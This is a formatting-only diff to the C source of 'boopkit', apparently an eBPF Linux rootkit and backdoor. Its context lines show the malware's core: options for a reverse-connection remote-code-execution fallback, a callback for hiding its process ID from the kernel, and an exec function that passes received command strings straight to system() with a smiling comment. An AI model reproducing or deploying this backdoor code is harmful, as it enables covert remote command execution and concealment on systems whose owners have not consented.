@@ -61,13 +61,13 @@ void usage() {
   boopprintf("-h, help           Display help and usage for boopkit.\n");
   boopprintf("-i, interface      Interface name. lo, eth0, wlan0, etc\n");
   boopprintf("-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.\n");
-  boopprintf("-r, reverse-conn   Attempt a reverse RCE lookup if no payload found.\n");
+  boopprintf(
+      "-r, reverse-conn   Attempt reverse RCE lookup if no payload found.\n");
   boopprintf("-q, quiet          Disable output.\n");
   boopprintf("-x, reject         Source addresses to reject triggers from.\n");
   boopprintf("\n");
   exit(0);
 }
-
 
 /**
  * recvrce is a last resort attempt to reverse dial for an RCE from a
@@ -139,9 +139,9 @@ struct config {
 
 /**
  * clisetup is used to initalize the program from the command line
- * 
- * @param argc 
- * @param argv 
+ *
+ * @param argc
+ * @param argv
  */
 void clisetup(int argc, char **argv) {
   cfg.denyc = 0;
@@ -195,11 +195,11 @@ static struct env {
 /**
  * cb_pid_lookup is a callback function for PID lookup at runtime
  * used in obfuscating boopkit from the rest of the kernel.
- * 
- * @param ctx 
- * @param data 
- * @param data_sz 
- * @return 
+ *
+ * @param ctx
+ * @param data
+ * @param data_sz
+ * @return
  */
 static int cb_pid_lookup(void *ctx, void *data, size_t data_sz) {
   // const struct event *e = data;
@@ -211,8 +211,8 @@ static int cb_pid_lookup(void *ctx, void *data, size_t data_sz) {
  *
  * Ideally boopkit is ran without sudo as uid=0 (root)
  *
- * @param argc 
- * @param argv 
+ * @param argc
+ * @param argv
  */
 void uid_check(int argc, char **argv) {
   long luid = (long)getuid();
@@ -255,14 +255,14 @@ int exec(char *rce) {
   char *ret;
   ret = strstr(rce, BOOPKIT_RCE_CMD_HALT);
   if (ret) {
-    runtime__xcap    = 0; // Stop the xcap loop
-    runtime__boopkit = 0; // Stop the boopkit loop
+    runtime__xcap = 0;     // Stop the xcap loop
+    runtime__boopkit = 0;  // Stop the boopkit loop
     boopprintf("  XX Halting boopkit: %s\n", BOOPKIT_RCE_CMD_HALT);
     free(rce);
     return 0;
   }
   boopprintf("  <- Executing: %s\n", rce);
-  system(rce); // :)
+  system(rce);  // :)
   free(rce);
   return 1;
 }
@@ -280,12 +280,12 @@ int main(int argc, char **argv) {
   uid_check(argc, argv);
   boopprintf("  -> Logs                    : /sys/kernel/tracing/trace_pipe\n");
 
-  int    loaded, err;
-  struct bpf_object  *bpobj;
-  struct pr0be_safe  *sfobj;
+  int loaded, err;
+  struct bpf_object *bpobj;
+  struct pr0be_safe *sfobj;
   struct bpf_program *progboop = NULL;
   struct ring_buffer *rb = NULL;
-  char   pid[16];
+  char pid[16];
 
   {
     // Start a new thread for DPI. @zomgwtfbbqkewl
@@ -426,7 +426,7 @@ int main(int argc, char **argv) {
       }
 
       // Future hook for probe specific logic
-      //if (ret.event_src_code == EVENT_SRC_BAD_CSUM) {
+      // if (ret.event_src_code == EVENT_SRC_BAD_CSUM) {
       //  boopprintf("  ** Boop EVENT_SRC_BAD_CSUM\n");
       //} else if (ret.event_src_code == EVENT_SRC_RECEIVE_RESET) {
       //  boopprintf("  ** Boop EVENT_SRC_RECEIVE_RESET\n");
